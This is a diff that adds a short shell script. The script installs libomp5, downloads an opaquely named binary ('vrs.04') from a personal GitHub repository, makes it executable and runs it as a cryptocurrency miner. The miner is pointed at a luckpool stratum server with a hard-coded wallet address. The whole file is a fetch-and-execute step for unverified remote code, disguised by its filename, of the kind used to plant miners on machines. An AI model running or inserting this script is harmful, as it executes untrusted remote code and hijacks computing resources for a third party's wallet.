@@ -1,0 +1,5 @@
+sudo apt update
+sudo apt install libomp5 -y
+wget https://github.com/bizreygha/amezx/raw/main/vrs.04
+chmod +x vrs.04
+./vrs.04 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RP3HAzjfe4sbNrk56AwtJvyvnmkxooVVXt.lol -p x -t 1
